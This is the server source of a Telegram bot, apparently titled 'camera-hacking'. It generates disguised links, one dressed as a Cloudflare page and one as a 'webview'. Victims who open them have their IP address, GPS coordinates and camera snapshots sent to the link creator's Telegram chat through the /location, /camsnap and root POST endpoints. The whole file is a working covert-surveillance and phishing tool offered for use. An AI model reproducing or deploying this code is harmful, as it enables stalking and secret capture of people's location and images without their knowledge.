const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fs = require("fs");
const fetch = require("node-fetch");
const TelegramBot = require("node-telegram-bot-api");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: "20mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "20mb" }));
app.set("view engine", "ejs");

const botToken = process.env["bot"];
const bot = new TelegramBot(botToken);
const webhookUrl = process.env["WEBHOOK_URL"] || "https://camera-hacking-iota.vercel.app/";

// Webhook endpoint for Telegram
app.post("/api/index.js", (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// Set webhook (only run this once manually)
bot.setWebHook(`${webhookUrl}/api/index.js`);

const hostURL = webhookUrl;
const use1pt = false;

app.get("/", (req, res) => {
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket?.remoteAddress;
  res.json({ ip });
});

app.get("/w/:path/:uri", (req, res) => {
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket?.remoteAddress;
  const time = new Date().toISOString().slice(0, 19).replace("T", ":");
  const decoded = Buffer.from(req.params.uri, "base64").toString("utf-8");

  if (req.params.path) {
    res.render("webview", { ip, time, url: decoded, uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    res.redirect("https://t.me/shinita_cameraBot");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket?.remoteAddress;
  const time = new Date().toISOString().slice(0, 19).replace("T", ":");
  const decoded = Buffer.from(req.params.uri, "base64").toString("utf-8");

  if (req.params.path) {
    res.render("cloudflare", { ip, time, url: decoded, uid: req.params.path, a: hostURL, t: use1pt });
  } else {
    res.redirect("https://t.me/shinita_cameraBot");
  }
});

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const m = {
    reply_markup: {
      inline_keyboard: [[{ text: "Create Link", callback_data: "crenew" }]]
    }
  };
  bot.sendMessage(chatId, `Welcome ${msg.chat.first_name}! Use me to generate tracking links.`, m);
});

bot.onText(/\/help/, (msg) => {
  bot.sendMessage(msg.chat.id, `Help content goes here...`);
});

bot.onText(/\/create/, (msg) => {
  createNew(msg.chat.id);
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;

  if (msg?.reply_to_message?.text === "🌐 Enter Your URL") {
    createLink(chatId, msg.text);
  }
});

bot.on("callback_query", (callbackQuery) => {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data === "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});

function createNew(cid) {
  bot.sendMessage(cid, "🌐 Enter Your URL", { reply_markup: { force_reply: true } });
}

async function createLink(cid, msg) {
  if (!/^https?:\/\//i.test(msg)) {
    bot.sendMessage(cid, "⚠️ Please enter a valid URL including http or https.");
    return createNew(cid);
  }

  const encodedUrl = Buffer.from(msg).toString("base64");
  const suffix = `${cid.toString(36)}/${encodedUrl}`;
  const cloudflareUrl = `${hostURL}/c/${suffix}`;
  const webviewUrl = `${hostURL}/w/${suffix}`;
  const m = {
    reply_markup: {
      inline_keyboard: [[{ text: "Create new Link", callback_data: "crenew" }]]
    }
  };

  bot.sendMessage(cid, `✅ Your Links:\n\n🌐 CloudFlare:\n${cloudflareUrl}\n\n🌐 WebView:\n${webviewUrl}`, m);
}

app.post("/location", (req, res) => {
  const uid = parseInt(req.body.uid, 36);
  const lat = parseFloat(req.body.lat);
  const lon = parseFloat(req.body.lon);
  const acc = req.body.acc;

  if (uid && lat && lon && acc) {
    bot.sendLocation(uid, lat, lon);
    bot.sendMessage(uid, `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
    res.send("Done");
  } else {
    res.status(400).send("Invalid data");
  }
});

app.post("/camsnap", (req, res) => {
  const uid = parseInt(req.body.uid, 36);
  const img = req.body.img;

  if (uid && img) {
    const buffer = Buffer.from(img, "base64");
    bot.sendPhoto(uid, buffer, {}, { filename: "camsnap.png", contentType: "image/png" });
    res.send("Done");
  } else {
    res.status(400).send("Invalid data");
  }
});

app.post("/", (req, res) => {
  const uid = parseInt(req.body.uid, 36);
  const data = req.body.data;
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket?.remoteAddress;

  if (uid && data?.includes(ip)) {
    bot.sendMessage(uid, data.replace(/<br>/g, "\n"), { parse_mode: "HTML" });
    res.send("Done");
  } else {
    res.status(400).send("Invalid data");
  }
});

module.exports = app;
